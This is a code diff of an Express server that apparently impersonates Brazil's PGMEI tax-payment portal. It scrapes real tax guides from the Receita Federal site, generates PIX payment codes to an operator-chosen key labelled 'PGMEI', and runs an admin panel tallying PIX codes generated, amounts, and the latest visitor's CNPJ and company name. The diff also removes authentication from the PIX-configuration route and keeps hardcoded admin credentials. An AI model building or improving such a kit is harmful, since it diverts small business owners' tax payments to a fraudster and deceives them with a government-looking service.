@@ -150,7 +150,6 @@ async function listarAnos(cnpj) {
 async function buscarGuiasPorAno(cnpj, ano) {
     const page = await obterPagina();
 
-    // Garantir que está na página de emissão
     await page.goto(`https://www8.receita.fazenda.gov.br/SimplesNacional/Aplicacoes/ATSPO/pgmei.app/emissao?cnpj=${cnpj}`, {
         waitUntil: 'domcontentloaded',
         timeout: 20000
@@ -158,16 +157,13 @@ async function buscarGuiasPorAno(cnpj, ano) {
 
     await page.waitForSelector('#anoCalendarioSelect, select[name="ano"]', { timeout: 10000, visible: true });
 
-    // Selecionar o ano
     await page.select('#anoCalendarioSelect, select[name="ano"]', ano);
 
-    // Clicar em "Ok"
     await Promise.all([
         page.click('#btnSelecionarAno, button[type="submit"]'),
         page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 20000 })
     ]);
 
-    // Aguardar a tabela
     try {
         await page.waitForSelector('#tabelaMeses tbody tr, .table tbody tr, table tbody tr', { timeout: 10000 });
     } catch (e) {
@@ -175,7 +171,6 @@ async function buscarGuiasPorAno(cnpj, ano) {
         return [];
     }
 
-    // Extrair guias do mês
     const guias = await page.evaluate((ano) => {
         const guias = [];
         const rows = document.querySelectorAll('#tabelaMeses tbody tr, .table tbody tr, table tbody tr');
@@ -189,16 +184,12 @@ async function buscarGuiasPorAno(cnpj, ano) {
                     mesNome.includes('Julho') || mesNome.includes('Agosto') || mesNome.includes('Setembro') ||
                     mesNome.includes('Outubro') || mesNome.includes('Novembro') || mesNome.includes('Dezembro'))) {
 
-                    // ============================================
-                    // CORREÇÃO DOS ÍNDICES DAS COLUNAS DA RECEITA
-                    // ============================================
                     const principal = cols[5]?.innerText.trim().replace(/R\$\s*/g, '').trim() || '0,00';
                     const multa = cols[6]?.innerText.trim().replace(/R\$\s*/g, '').trim() || '0,00';
                     const juros = cols[7]?.innerText.trim().replace(/R\$\s*/g, '').trim() || '0,00';
                     const total = cols[8]?.innerText.trim().replace(/R\$\s*/g, '').trim() || '0,00';
                     const vencimento = cols[9]?.innerText.trim() || '-';
                     const acolhimento = cols[10]?.innerText.trim() || '-';
-                    // ============================================
                     
                     const apurado = cols[2]?.innerText.trim() || 'Não';
 
@@ -264,12 +255,18 @@ app.post('/salvar_cnpj.php', upload.none(), async (req, res) => {
         req.session.cnpj = cnpj;
         req.session.cnpj_formatado = dados.cnpj_formatado || formatarCNPJ(cnpj);
         req.session.nome_empresa = dados.nome_empresa || 'EMPRESA NÃO ENCONTRADA';
-        // Registrar consulta no painel
+        
         const stats = loadStats();
         stats.consultas += 1;
+        // Salva a última consulta para mostrar no painel
+        stats.ultima_consulta = { 
+            cnpj: req.session.cnpj_formatado, 
+            nome: req.session.nome_empresa 
+        };
         stats.eventos.unshift({ data: new Date().toLocaleString(), acao: `Consulta CNPJ ${req.session.cnpj_formatado}` });
         if (stats.eventos.length > 50) stats.eventos.pop();
         saveStats(stats);
+
         res.json({
             success: true,
             data: {
@@ -283,9 +280,6 @@ app.post('/salvar_cnpj.php', upload.none(), async (req, res) => {
     }
 });
 
-// ============================================
-// ENDPOINT: RETORNAR ANOS E GUIAS DO ANO SELECIONADO
-// ============================================
 app.post('/salvar_cnpj_emissao.php', uploadMultipart.none(), async (req, res) => {
     const cnpj = req.body.cnpj?.replace(/\D/g, '') || req.session.cnpj;
     if (!cnpj) {
@@ -293,27 +287,21 @@ app.post('/salvar_cnpj_emissao.php', uploadMultipart.none(), async (req, res) =>
     }
 
     try {
-        // 1. Obter anos disponíveis
         const anos = await listarAnos(cnpj);
-        
-        // 2. Escolher o ano atual (ou o último)
         const anoAtual = new Date().getFullYear();
         const anoSelecionado = anos.includes(anoAtual) ? anoAtual : anos[anos.length - 1] || '2026';
         
-        // 3. Verificar cache da sessão
         let guias = [];
         if (req.session.guiasCache && req.session.guiasCache.cnpj === cnpj && req.session.guiasCache.ano === anoSelecionado) {
             const idade = Date.now() - req.session.guiasCache.timestamp;
-            if (idade < 5 * 60 * 1000) { // 5 minutos
+            if (idade < 5 * 60 * 1000) {
                 console.log('📦 Usando cache para o ano', anoSelecionado);
                 guias = req.session.guiasCache.guias;
             }
         }
 
-        // 4. Se não tiver cache, buscar
         if (!guias || guias.length === 0) {
             guias = await buscarGuiasPorAno(cnpj, anoSelecionado);
-            // Guardar no cache da sessão
             req.session.guiasCache = {
                 cnpj: cnpj,
                 ano: anoSelecionado,
@@ -322,20 +310,23 @@ app.post('/salvar_cnpj_emissao.php', uploadMultipart.none(), async (req, res) =>
             };
         }
 
-        // 5. Registrar clique no painel
         const stats = loadStats();
         stats.cliques += 1;
+        // Salva a última consulta para mostrar no painel
+        stats.ultima_consulta = { 
+            cnpj: req.session.cnpj_formatado, 
+            nome: req.session.nome_empresa 
+        };
         stats.eventos.unshift({ data: new Date().toLocaleString(), acao: 'Emissão carregada' });
         if (stats.eventos.length > 50) stats.eventos.pop();
         saveStats(stats);
 
-        // 6. Retornar dados
         res.json({
             success: true,
             data: {
                 api_completa: { guias: guias },
                 guias: guias,
-                anos: anos // Para o frontend preencher o select
+                anos: anos
             }
         });
     } catch (error) {
@@ -345,7 +336,7 @@ app.post('/salvar_cnpj_emissao.php', uploadMultipart.none(), async (req, res) =>
 });
 
 // ============================================
-// ENDPOINT: GERAR PIX (COM CHAVE SALVA)
+// ENDPOINT: GERAR PIX
 // ============================================
 app.post('/api/superpay_pix.php', express.json(), (req, res) => {
     const valor = parseFloat(req.body.valor) || 0;
@@ -354,10 +345,8 @@ app.post('/api/superpay_pix.php', express.json(), (req, res) => {
     const nome = stats.nome || 'PGMEI';
     const cidade = stats.cidade || 'Brasil';
 
-    // Montar payload PIX (exemplo simplificado)
     const payload = `00020126580014br.gov.bcb.pix0136${chavePix}5204000053039865404${valor.toFixed(2).replace('.', '')}5802BR5925${nome.substring(0, 25)}6009${cidade.substring(0, 15)}62070503***6304E1B7`;
 
-    // Registrar no painel
     stats.pix_gerados += 1;
     stats.valor_total += valor;
     stats.eventos.unshift({ data: new Date().toLocaleString(), acao: `PIX gerado R$ ${valor.toFixed(2)}` });
@@ -397,7 +386,7 @@ app.get('/api/status', (req, res) => {
 });
 
 // ============================================
-// PAINEL ADMINISTRATIVO - ESTATÍSTICAS
+// PAINEL ADMINISTRATIVO
 // ============================================
 const STATS_FILE = path.join(__dirname, 'stats.json');
 
@@ -407,14 +396,13 @@ function loadStats() {
             return JSON.parse(fs.readFileSync(STATS_FILE, 'utf8'));
         }
     } catch (e) {}
-    return { consultas: 0, cliques: 0, pix_gerados: 0, valor_total: 0, chave_pix: '', nome: '', cidade: '', identificador: '', eventos: [] };
+    return { consultas: 0, cliques: 0, pix_gerados: 0, valor_total: 0, chave_pix: '', nome: '', cidade: '', identificador: '', ultima_consulta: { cnpj: '', nome: '' }, eventos: [] };
 }
 
 function saveStats(stats) {
     fs.writeFileSync(STATS_FILE, JSON.stringify(stats, null, 2));
 }
 
-// Credenciais do admin
 const ADMIN_USER = 'admin';
 const ADMIN_PASS = 'pgmei2026';
 
@@ -447,7 +435,8 @@ app.get('/api/admin/dashboard', checkAdmin, (req, res) => {
         valorTotalCopiado: 0,
         totalPixCopiados: 0,
         totalPagamentos: 0,
-        valorTotalPago: 0
+        valorTotalPago: 0,
+        ultimaConsulta: stats.ultima_consulta || { cnpj: '', nome: '' } // Envia o último CNPJ
     });
 });
 
@@ -486,7 +475,10 @@ app.get('/api/admin/logs/pix', checkAdmin, (req, res) => {
     res.json(logs);
 });
 
-app.get('/api/admin/config/pix', checkAdmin, (req, res) => {
+// ============================================
+// ROTA PÚBLICA DA CHAVE PIX (CORRIGIDA - SEM checkAdmin)
+// ============================================
+app.get('/api/admin/config/pix', (req, res) => {
     const stats = loadStats();
     res.json({
         nome: stats.nome || 'PGMEI',
